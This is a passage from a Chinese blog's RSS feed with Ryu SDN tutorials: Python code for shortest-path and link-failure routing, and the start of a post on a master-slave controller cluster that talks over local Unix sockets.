datapath = datapaths[path[i]]</span><br><span class="line">                    self.send_flow_mod(datapath, flow_info, src_port, dst_port)</span><br><span class="line">                    self.send_flow_mod(datapath, back_info, dst_port, src_port)</span><br><span class="line">                    self.logger.debug(&quot;inter_link flow install&quot;)</span><br><span class="line">        if len(path) &gt; 1:</span><br><span class="line">            # the last flow entry: tor -&gt; host</span><br><span class="line">            port_pair = self.get_port_pair_from_link(link_to_port,</span><br><span class="line">                                                     path[-2], path[-1])</span><br><span class="line">            if port_pair is None:</span><br><span class="line">                self.logger.info(&quot;Port is not found&quot;)</span><br><span class="line">                return</span><br><span class="line">            src_port = port_pair[1]</span><br><span class="line"></span><br><span class="line">            dst_port = self.get_port(flow_info[2], access_table)</span><br><span class="line">            if dst_port is None:</span><br><span class="line">                self.logger.info(&quot;Last port is not found.&quot;)</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">            last_dp = datapaths[path[-1]]</span><br><span class="line">            self.send_flow_mod(last_dp, flow_info, src_port, dst_port)</span><br><span class="line">            self.send_flow_mod(last_dp, back_info, dst_port, src_port)</span><br><span class="line"></span><br><span class="line">            # the first flow entry</span><br><span class="line">            port_pair = self.get_port_pair_from_link(link_to_port,</span><br><span class="line">                                                     path[0], path[1])</span><br><span class="line">            if port_pair is None:</span><br><span class="line">                self.logger.info(&quot;Port not found in first hop.&quot;)</span><br><span class="line">                return</span><br><span class="line">            out_port = port_pair[0]</span><br><span class="line">            self.send_flow_mod(first_dp, flow_info, in_port, out_port)</span><br><span class="line">            self.send_flow_mod(first_dp, back_info, out_port, in_port)</span><br><span class="line">            self.send_packet_out(first_dp, buffer_id, in_port, out_port, data)</span><br><span class="line"></span><br><span class="line">        # src and dst on the same datapath</span><br><span class="line">        else:</span><br><span class="line">            out_port = self.get_port(flow_info[2], access_table)</span><br><span class="line">            if out_port is None:</span><br><span class="line">                self.logger.info(&quot;Out_port is None in same dp&quot;)</span><br><span class="line">                return</span><br><span class="line">            self.send_flow_mod(first_dp, flow_info, in_port, out_port)</span><br><span class="line">            self.send_flow_mod(first_dp, back_info, out_port, in_port)</span><br><span class="line">            self.send_packet_out(first_dp, buffer_id, in_port, out_port, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def create_port_map(self, switch_list):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Create interior_port table and access_port table.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        for sw in switch_list:</span><br><span class="line">            dpid = sw.dp.id</span><br><span class="line">            # self.switch_set.add(dpid)</span><br><span class="line">            self.switch_port_table.setdefault(dpid, set())</span><br><span class="line">            self.interior_ports.setdefault(dpid, set())</span><br><span class="line">            self.access_ports.setdefault(dpid, set())</span><br><span class="line"></span><br><span class="line">            for p in sw.ports:</span><br><span class="line">                self.switch_port_table[dpid].add(p.port_no)</span><br><span class="line">        # print &quot;switches set is :&quot;,self.switch_set</span><br><span class="line"></span><br><span class="line">    def create_interior_links(self, link_list):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Get links`srouce port to dst port  from link_list,</span><br><span class="line">            link_to_port:(src_dpid,dst_dpid)-&gt;(src_port,dst_port)</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        for link in link_list:</span><br><span class="line">            src = link.src</span><br><span class="line">            dst = link.dst</span><br><span class="line">            self.link_to_port[</span><br><span class="line">                (src.dpid, dst.dpid)] = (src.port_no, dst.port_no)</span><br><span class="line"></span><br><span class="line">            # Find the access ports and interiorior ports</span><br><span class="line">            if link.src.dpid in self.switches:</span><br><span class="line">                self.interior_ports[link.src.dpid].add(link.src.port_no)</span><br><span class="line">            if link.dst.dpid in self.switches:</span><br><span class="line">                self.interior_ports[link.dst.dpid].add(link.dst.port_no)</span><br><span class="line"></span><br><span class="line">    def create_access_ports(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Get ports without link into access_ports</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        for sw in self.switch_port_table:</span><br><span class="line">            all_port_table = self.switch_port_table[sw]</span><br><span class="line">            interior_port = self.interior_ports[sw]</span><br><span class="line">            self.access_ports[sw] = all_port_table - interior_port</span><br><span class="line"></span><br><span class="line">    def k_shortest_paths(self, graph, src, dst, weight=&apos;weight&apos;, k=1):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Great K shortest paths of src to dst.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        generator = nx.shortest_simple_paths(graph, source=src,</span><br><span class="line">                                             target=dst, weight=weight)</span><br><span class="line">        shortest_paths = []</span><br><span class="line">        try:</span><br><span class="line">            for path in generator:</span><br><span class="line">                if k &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                shortest_paths.append(path)</span><br><span class="line">                k -= 1</span><br><span class="line">            return shortest_paths</span><br><span class="line">        except:</span><br><span class="line">            self.logger.debug(&quot;No path between %s and %s&quot; % (src, dst))</span><br><span class="line"></span><br><span class="line">    def all_k_shortest_paths(self, graph, weight=&apos;weight&apos;, k=1):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Creat all K shortest paths between datapaths.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        _graph = copy.deepcopy(graph)</span><br><span class="line">        paths = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        # Find ksp in graph.</span><br><span class="line">        for src in _graph.nodes():</span><br><span class="line">            paths.setdefault(src, &#123;src: [[src] for i in xrange(k)]&#125;)</span><br><span class="line">            for dst in _graph.nodes():</span><br><span class="line">                if src == dst:</span><br><span class="line">                    continue</span><br><span class="line">                paths[src].setdefault(dst, [])</span><br><span class="line">                paths[src][dst] = self.k_shortest_paths(_graph, src, dst,</span><br><span class="line">                                                        weight=weight, k=k)</span><br><span class="line">        return paths</span><br><span class="line"></span><br><span class="line">    def mac_learning(self,dpid,src_mac,in_port):</span><br><span class="line">        self.mac_to_port.setdefault(dpid, &#123;&#125;)</span><br><span class="line">        if src_mac in self.mac_to_port[dpid]:</span><br><span class="line">            if in_port != self.mac_to_port[dpid][src_mac]:</span><br><span class="line">                return False</span><br><span class="line">        else:</span><br><span class="line">            self.mac_to_port[dpid][src_mac] = in_port</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">    def arp_forwarding(self,msg,src_ip,dst_ip,eth_pkt):</span><br><span class="line">        datapath = msg.datapath</span><br><span class="line">        parser = datapath.ofproto_parser</span><br><span class="line">        in_port = msg.match[&apos;in_port&apos;]</span><br><span class="line"></span><br><span class="line">        out_port = self.mac_to_port[datapath.id].get(eth_pkt.dst)</span><br><span class="line">        if out_port is not None:</span><br><span class="line">            match = parser.OFPMatch(in_port=in_port, eth_dst=eth_pkt.dst,</span><br><span class="line">                                    eth_type=eth_pkt.ethertype)</span><br><span class="line">            actions = [parser.OFPActionOutput(out_port)]</span><br><span class="line">            self.add_flow(datapath,1, match, actions)</span><br><span class="line">            self.send_packet_out(datapath, msg.buffer_id, in_port,</span><br><span class="line">                                 out_port, msg.data)</span><br><span class="line">            self.logger.debug(&quot;Reply ARP to knew host&quot;)</span><br><span class="line">        else:</span><br><span class="line">            self.flood(msg)</span><br><span class="line"></span><br><span class="line">    def send_packet_out(self, datapath, buffer_id, src_port, dst_port, data):</span><br><span class="line">        out = self._build_packet_out(datapath, buffer_id,</span><br><span class="line">                                     src_port, dst_port, data)</span><br><span class="line">        if out:</span><br><span class="line">            datapath.send_msg(out)</span><br><span class="line"></span><br><span class="line">    def _build_packet_out(self, datapath, buffer_id, src_port, dst_port, data):</span><br><span class="line">        actions = []</span><br><span class="line">        if dst_port:</span><br><span class="line">            actions.append(datapath.ofproto_parser.OFPActionOutput(dst_port))</span><br><span class="line"></span><br><span class="line">        msg_data = None</span><br><span class="line">        if buffer_id == datapath.ofproto.OFP_NO_BUFFER:</span><br><span class="line">            if data is None:</span><br><span class="line">                return None</span><br><span class="line">            msg_data = data</span><br><span class="line"></span><br><span class="line">        out = datapath.ofproto_parser.OFPPacketOut(</span><br><span class="line">            datapath=datapath, buffer_id=buffer_id,</span><br><span class="line">            data=msg_data, in_port=src_port, actions=actions)</span><br><span class="line">        return out</span><br><span class="line"></span><br><span class="line">    def flood(self, msg):</span><br><span class="line">        datapath = msg.datapath</span><br><span class="line">        ofproto = datapath.ofproto</span><br><span class="line">        parser = datapath.ofproto_parser</span><br><span class="line">        out = self._build_packet_out(datapath, ofproto.OFP_NO_BUFFER,</span><br><span class="line">                                     ofproto.OFPP_CONTROLLER,</span><br><span class="line">                                     ofproto.OFPP_FLOOD, msg.data)</span><br><span class="line">        datapath.send_msg(out)</span><br><span class="line">        self.logger.debug(&quot;Flooding msg&quot;)</span><br><span class="line"></span><br><span class="line">    # List the event list should be listened.</span><br><span class="line">    events = [event.EventSwitchEnter,</span><br><span class="line">              event.EventSwitchLeave, event.EventPortAdd,</span><br><span class="line">              event.EventPortDelete, event.EventPortModify,</span><br><span class="line">              event.EventLinkAdd, event.EventLinkDelete]</span><br><span class="line"></span><br><span class="line">    @set_ev_cls(events)</span><br><span class="line">    def get_topology(self, ev):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Get topology info and calculate shortest paths.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        switch_list = get_switch(self.topology_api_app, None)</span><br><span class="line">        self.create_port_map(switch_list)</span><br><span class="line">        self.switches = self.switch_port_table.keys()</span><br><span class="line">        # print self.switches</span><br><span class="line">        links = get_link(self.topology_api_app, None)</span><br><span class="line">        # print links</span><br><span class="line">        self.create_interior_links(links)</span><br><span class="line">        self.create_access_ports()</span><br><span class="line">        self.get_graph(self.link_to_port.keys())</span><br><span class="line">        self.shortest_paths = self.all_k_shortest_paths(</span><br><span class="line">            self.graph, weight=&apos;weight&apos;, k=CONF.k_paths)</span><br><span class="line">        # print &quot;***************&quot;,self.access_ports</span><br><span class="line"></span><br><span class="line">    def register_access_info(self, dpid, in_port, ip, mac):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Register access host info into access table.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if in_port in self.access_ports[dpid]:</span><br><span class="line">            if (dpid, in_port) in self.access_table:</span><br><span class="line">                if self.access_table[(dpid, in_port)] == (ip, mac):</span><br><span class="line">                    return</span><br><span class="line">                else:</span><br><span class="line">                    self.access_table[(dpid, in_port)] = (ip, mac)</span><br><span class="line">                    return</span><br><span class="line">            else:</span><br><span class="line">                self.access_table.setdefault((dpid, in_port), None)</span><br><span class="line">                self.access_table[(dpid, in_port)] = (ip, mac)</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">    @set_ev_cls(ofp_event.EventOFPPacketIn, MAIN_DISPATCHER)</span><br><span class="line">    def _packet_in_handler(self, ev):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Hanle the packet in packet, and register the access info.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        msg = ev.msg</span><br><span class="line">        datapath = msg.datapath</span><br><span class="line">        dpid = datapath.id</span><br><span class="line"></span><br><span class="line">        parser = datapath.ofproto_parser</span><br><span class="line">        in_port = msg.match[&apos;in_port&apos;]</span><br><span class="line">        pkt = packet.Packet(msg.data)</span><br><span class="line"></span><br><span class="line">        eth = pkt.get_protocols(ethernet.ethernet)[0]</span><br><span class="line">        # print &quot;eth src is : &quot;,eth.src</span><br><span class="line"></span><br><span class="line">        eth_type = eth.ethertype</span><br><span class="line">        arp_pkt = pkt.get_protocol(arp.arp)</span><br><span class="line">        ip_pkt = pkt.get_protocol(ipv4.ipv4)</span><br><span class="line">        ip_pkt_6 = pkt.get_protocol(ipv6.ipv6)</span><br><span class="line">        # if eth_type == ether_types.ETH_TYPE_LLDP  or ether_types.ETH_TYPE_IPV6:</span><br><span class="line">        #     print eth_type</span><br><span class="line">        #     pass</span><br><span class="line"></span><br><span class="line">        if eth_type == ether_types.ETH_TYPE_LLDP:</span><br><span class="line">            # print &quot;lldp eth src is &#123;0&#125;,dst is &#123;1&#125;:&quot;.format(eth.src,eth.dst),datapath</span><br><span class="line">            return</span><br><span class="line">        if isinstance(ip_pkt_6, ipv6.ipv6):</span><br><span class="line">            self.logger.debug(&quot;ipv6 is processing&quot;)</span><br><span class="line">            actions = []</span><br><span class="line">            match = parser.OFPMatch(eth_type=ether.ETH_TYPE_IPV6)</span><br><span class="line">            self.add_flow(datapath,1, match, actions)</span><br><span class="line">            # print &quot;ipv6 eth src is &#123;0&#125;,dst is &#123;1&#125;:&quot;.format(eth.src,eth.dst),datapath</span><br><span class="line">            return</span><br><span class="line">        if isinstance(arp_pkt,arp.arp):</span><br><span class="line">            self.logger.info(&quot;arp is processing&quot;)</span><br><span class="line">            if self.mac_learning(dpid,eth.src,in_port) is False:</span><br><span class="line">                self.logger.info(&quot;ARP packet enter in error port&quot;)</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">            # print &quot;arp packet form &#123;0&#125; to &#123;1&#125; is processing&quot;.format(arp_pkt.src_ip,arp_pkt.dst_ip)</span><br><span class="line">            # print &quot;arp packet mac is from &#123;0&#125; to &#123;1&#125;&quot;.format(arp_pkt.src_mac,arp_pkt.dst_mac)</span><br><span class="line">            arp_src_ip = arp_pkt.src_ip</span><br><span class="line">            arp_dst_ip = arp_pkt.dst_ip</span><br><span class="line">            mac = arp_pkt.src_mac</span><br><span class="line">            # Record the access info</span><br><span class="line">            self.register_access_info(datapath.id, in_port, arp_src_ip, mac)</span><br><span class="line">            self.arp_forwarding(msg, arp_pkt.src_ip, arp_pkt.dst_ip, eth)</span><br><span class="line"></span><br><span class="line">        # print &quot;nothing ?????????????&quot;,eth_type,eth.src,eth.dst</span><br><span class="line">        if isinstance(ip_pkt,ipv4.ipv4):</span><br><span class="line">            self.logger.debug(&quot;ipv4 is processing&quot;)</span><br><span class="line">            # print &quot;access table :&quot;,self.access_table</span><br><span class="line">            # result = self.get_sw(dpid,in_port,)</span><br><span class="line">            self.shortest_forwarding(msg, eth_type, ip_pkt.src, ip_pkt.dst)</span><br><span class="line">            return</span><br><span class="line">            # print &quot;ipv4 eth type is : &quot;,eth_type</span><br><span class="line">            out_port = None</span><br><span class="line">            if eth.dst in self.mac_to_port[dpid]:</span><br><span class="line">                out_port = self.mac_to_port[dpid][eth.dst]</span><br><span class="line">                actions = [parser.OFPActionOutput(out_port)]</span><br><span class="line">                match = parser.OFPMatch(in_port=in_port, eth_dst=eth.dst,</span><br><span class="line">                                        eth_type=eth.ethertype)</span><br><span class="line">                self.add_flow(datapath,1, match, actions)</span><br><span class="line">                self.send_packet_out(datapath, msg.buffer_id, in_port,</span><br><span class="line">                                     out_port, msg.data)</span><br><span class="line">            else:</span><br><span class="line">                if self.mac_learning(dpid, eth.src, in_port) is False:</span><br><span class="line">                    self.logger.debug(&quot;IPV4 packet enter in different ports&quot;)</span><br><span class="line">                    return</span><br><span class="line">                else:</span><br><span class="line">                    self.flood(msg)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def show_topology(self):</span><br><span class="line">        switch_num = len(self.graph.nodes())</span><br><span class="line">        if self.pre_graph.edges() != self.graph.edges() and setting.TOSHOW:</span><br><span class="line">            print &quot;---------------------Topo Link---------------------&quot;</span><br><span class="line">            print &apos;%10s&apos; % (&quot;switch&quot;),</span><br><span class="line">            for i in self.graph.nodes():</span><br><span class="line">                print &apos;%10d&apos; % i,</span><br><span class="line">            print &quot;&quot;</span><br><span class="line">            for i in self.graph.nodes():</span><br><span class="line">                print &apos;%10d&apos; % i,</span><br><span class="line">                for j in self.graph.nodes():</span><br><span class="line">                    if (i,j) in self.graph.edges():</span><br><span class="line">                        print &apos;%10.0f&apos; % self.graph[i][j][&apos;weight&apos;],</span><br><span class="line">                    else:</span><br><span class="line">                        print &apos;%10.0f&apos;%float(&apos;inf&apos;),</span><br><span class="line">                # for j in self.graph[i].values():</span><br><span class="line">                #     print &apos;%10.0f&apos; % j[&apos;weight&apos;],</span><br><span class="line">                print &quot;&quot;</span><br><span class="line">            self.pre_graph = copy.deepcopy(self.graph)</span><br><span class="line"></span><br><span class="line">        if self.pre_link_to_port != self.link_to_port and setting.TOSHOW:</span><br><span class="line">            print &quot;---------------------Link Port---------------------&quot;</span><br><span class="line">            print &apos;%10s&apos; % (&quot;switch&quot;),</span><br><span class="line">            for i in self.graph.nodes():</span><br><span class="line">                print &apos;%10d&apos; % i,</span><br><span class="line">            print &quot;&quot;</span><br><span class="line">            for i in self.graph.nodes():</span><br><span class="line">                print &apos;%10d&apos; % i,</span><br><span class="line">                for j in self.graph.nodes():</span><br><span class="line">                    if (i, j) in self.link_to_port.keys():</span><br><span class="line">                        print &apos;%10s&apos; % str(self.link_to_port[(i, j)]),</span><br><span class="line">                    else:</span><br><span class="line">                        print &apos;%10s&apos; % &quot;No-link&quot;,</span><br><span class="line">                print &quot;&quot;</span><br><span class="line">            self.pre_link_to_port = copy.deepcopy(self.link_to_port)</span><br><span class="line"></span><br><span class="line">        if self.pre_access_table != self.access_table and setting.TOSHOW:</span><br><span class="line">            print &quot;----------------Access Host-------------------&quot;</span><br><span class="line">            print &apos;%10s&apos; % (&quot;(switch,port)&quot;), &apos;%12s&apos; % &quot;Host&quot;</span><br><span class="line">            if not self.access_table.keys():</span><br><span class="line">                print &quot;    NO found host&quot;</span><br><span class="line">            else:</span><br><span class="line">                for tup in self.access_table:</span><br><span class="line">                    print &apos;%10d:    &apos; %tup[0],self.access_table[tup]</span><br><span class="line">            self.pre_access_table = copy.deepcopy(self.access_table)</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总体来说，链路故障的修复功能还是比较容易理解和实现的，相信接触过Ryu的小伙伴们都可以看得懂。这次仅仅考虑了链路故障修复过程中的网络连通性的要求，对于修复后的网络QoS并没有考虑，如果有机会以后会更新基于QoS感知的链路修复功能。晚安~</p>]]></content:encoded>
      
      <comments>http://prayallforyou.top/2018/04/01/ryuRouting/#disqus_thread</comments>
    </item>
    
    <item>
      <title>使用Ryu搭建控制器集群</title>
      <link>http://prayallforyou.top/2017/12/01/multiControllerinRyu/</link>
      <guid>http://prayallforyou.top/2017/12/01/multiControllerinRyu/</guid>
      <pubDate>Fri, 01 Dec 2017 13:07:11 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;SDN中的多控制器架构&quot;&gt;&lt;a href=&quot;#SDN中的多控制器架构&quot; class=&quot;headerlink&quot; title=&quot;SDN中的多控制器架构&quot;&gt;&lt;/a&gt;SDN中的多控制器架构&lt;/h2&gt;&lt;p&gt;随着网络规模的扩大和管理方式的多样化，传统SDN中的单控制器模式逐渐
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="SDN中的多控制器架构"><a href="#SDN中的多控制器架构" class="headerlink" title="SDN中的多控制器架构"></a>SDN中的多控制器架构</h2><p>随着网络规模的扩大和管理方式的多样化，传统SDN中的单控制器模式逐渐显露出弊端和缺陷。其中单控制器模式中存在的一大威胁就是单点故障问题，一旦出现故障就导致全网瘫痪。为了克服单控制器的先天性缺陷，各种方案被提出。多控制器架构作为一种被广泛认可的方式得到了快速的发张，相应的出现了多个演化方向。控制器之间可以是平等关系，两两相互通信，也可以是层级关系，上层控制器负责管理下层的控制器。<br>两种架构方式可以简单的以下图表示：<img src="/iamges/compare.jpg" alt=""><br>其中图（1）表示控制器间平等的架构方式，不存在超级控制节点，各个控制器可以相同通信，当然也可以采用选举的方式选择一个管理节点来更好地协同调度。图（2）展示了多层级（两层）的控制器架构。上层控制器管理下层控制器，最底层控制器管理实际的网络设备。接下来就重点介绍一下两层控制器架构的搭建方法。</p><h2 id="主从式控制器集群搭建"><a href="#主从式控制器集群搭建" class="headerlink" title="主从式控制器集群搭建"></a>主从式控制器集群搭建</h2><p>化繁就简，本文实现了一种最为简单的主从式控制器demo。采用CS架构。上层存在一个超级控制器作为服务端接收客户端上传的数据，下层存在做个控制器作为客户端和超级节点建立连接，提供数据给上层节点并执行上层节点的决策。</p><h3 id="超级控制器作为服务端"><a href="#超级控制器作为服务端" class="headerlink" title="超级控制器作为服务端"></a>超级控制器作为服务端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">description:</span><br><span class="line">    A superController process as a Server to normal controlles.</span><br><span class="line">author:</span><br><span class="line">    wanglikun</span><br><span class="line">date:</span><br><span class="line">    v0: 2017/12/01</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from ryu.base import app_manager</span><br><span class="line">from ryu.controller import ofp_event</span><br><span class="line">from ryu.controller.handler import CONFIG_DISPATCHER, MAIN_DISPATCHER</span><br><span class="line">from ryu.controller.handler import set_ev_cls</span><br><span class="line">from ryu.ofproto import ofproto_v1_3</span><br><span class="line">from ryu.lib import hub</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import setting</span><br><span class="line">import logging</span><br><span class="line">import socket</span><br><span class="line">from threading import Thread</span><br><span class="line">import socket</span><br><span class="line">socketList = &#123;&#125;</span><br><span class="line">maxConnectionNum = 3</span><br><span class="line"></span><br><span class="line">#wait socket connection</span><br><span class="line">def waitConnect(server):</span><br><span class="line">    while True:</span><br><span class="line">        connection,address = server.accept()</span><br><span class="line">        if connection not in socketList:</span><br><span class="line">            socketList.setdefault(connection,[])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># main function, set up a server socket to listen connection from clients</span><br><span class="line">def main():</span><br><span class="line">    server = socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)</span><br><span class="line">    if os.path.exists(&apos;/tmp/ryu_superControler.sock&apos;):</span><br><span class="line">        os.unlink(&apos;/tmp/ryu_superControler.sock&apos;)</span><br><span class="line">    server.bind(&apos;/tmp/ryu_superControler.sock&apos;)</span><br><span class="line">    server.listen(1024)</span><br><span class="line">    waitThread = Thread(target=waitConnect,args=(server,))</span><br><span class="line">    waitThread.start()</span><br><span class="line">    print &quot;waiting at least a client connection&quot;</span><br><span class="line">    # guarantee all controllers are connected,then process them.</span><br><span class="line">    while len(socketList) != maxConnectionNum:</span><br><span class="line">        pass</span><br><span class="line">    print &quot;All controllers are connected to Super Controller!&quot;</span><br><span class="line">    for client in socketList:</span><br><span class="line">        print client</span><br><span class="line">    while True:</span><br><span class="line">        #do what you what</span><br><span class="line">    #disconncet all connections</span><br><span class="line">    for con in socketList:</span><br><span class="line">        con.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="正常控制器作为客户端"><a href="#正常控制器作为客户端" class="headerlink" title="正常控制器作为客户端"></a>正常控制器作为客户端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">description:</span><br><span class="line">A load calculation module to the controller, calculate the rate of Packet_In</span><br><span class="line">message per second, and decide wether to communicate with other controller</span><br><span class="line">according to threshold.</span><br><span class="line">author:</span><br><span class="line">wanglikun</span><br><span class="line">date:</span><br><span class="line">v0: 2017/11/28</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from ryu.base import app_manager</span><br><span class="line">from ryu.controller import ofp_event</span><br><span class="line">from ryu.controller.handler import CONFIG_DISPATCHER, MAIN_DISPATCHER</span><br><span class="line">from ryu.controller.handler import set_ev_cls</span><br><span class="line">from ryu.ofproto import ofproto_v1_3</span><br><span class="line">from ryu.lib import hub</span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">from threading import Thread</span><br><span class="line">import setting</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">class LoadBalancer(app_manager.RyuApp):</span><br><span class="line">    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]</span><br><span class="line">    def __init__(self, *args, **kwargs):</span><br><span class="line">        super(LoadBalancer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.daemon_thread = hub.spawn(self._detect) # Start a green thread to calculate the load.</span><br><span class="line">        #self.loadCom_peri = hub.spawn(self._comthread) # start a thread to communicate with other controller process</span><br><span class="line">        self.com_thread = Thread(target=self._comthread)</span><br><span class="line">        self.com_thread.start()</span><br><span class="line"></span><br><span class="line">    #do what you want in a thread function.</span><br><span class="line">    def _detect(self):</span><br><span class="line">        while True:</span><br><span class="line">            # do something....</span><br><span class="line"></span><br><span class="line">    # recv funcion in a socketList</span><br><span class="line">    def client_recv_fuc(self,client):</span><br><span class="line">        data = client.recv(1024).decode(&apos;utf-8&apos;)</span><br><span class="line">        print &quot;received data from server:%s&quot;%data</span><br><span class="line"></span><br><span class="line">    #communication thread</span><br><span class="line">    def _comthread(self):</span><br><span class="line">        self.logger.info(&quot;periodically communication is running...&quot;)</span><br><span class="line">        client = socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)</span><br><span class="line">        client.connect(&apos;/tmp/ryu_superControler.sock&apos;)</span><br><span class="line">        print &quot;Conncected super Controler succeed&quot;</span><br><span class="line">        Thread(target=self.client_recv_fuc,args=(client,)).start()</span><br><span class="line">        while True:</span><br><span class="line">            # do what you want and send them to server</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @set_ev_cls(ofp_event.EventOFPSwitchFeatures, CONFIG_DISPATCHER)</span><br><span class="line">    def switch_features_handler(self, ev):</span><br><span class="line">        datapath = ev.msg.datapath</span><br><span class="line">        ofproto = datapath.ofproto</span><br><span class="line">        parser = datapath.ofproto_parser</span><br><span class="line"></span><br><span class="line">        match = parser.OFPMatch()</span><br><span class="line">        actions = [parser.OFPActionOutput(ofproto.OFPP_CONTROLLER,</span><br><span class="line">                                          ofproto.OFPCML_NO_BUFFER)]</span><br><span class="line">        self.add_flow(datapath, 0, match, actions)</span><br><span class="line"></span><br><span class="line">    def add_flow(self, datapath, priority, match, actions, buffer_id=None):</span><br><span class="line">        ofproto = datapath.ofproto</span><br><span class="line">        parser = datapath.ofproto_parser</span><br><span class="line"></span><br><span class="line">        inst = [parser.OFPInstructionActions(ofproto.OFPIT_APPLY_ACTIONS,</span><br><span class="line">                                             actions)]</span><br><span class="line">        if buffer_id:</span><br><span class="line">            mod = parser.OFPFlowMod(datapath=datapath, buffer_id=buffer_id,</span><br><span class="line">                                    priority=priority, match=match,</span><br><span class="line">                                    instructions=inst)</span><br><span class="line">        else:</span><br><span class="line">            mod = parser.OFPFlowMod(datapath=datapath, priority=priority,</span><br><span 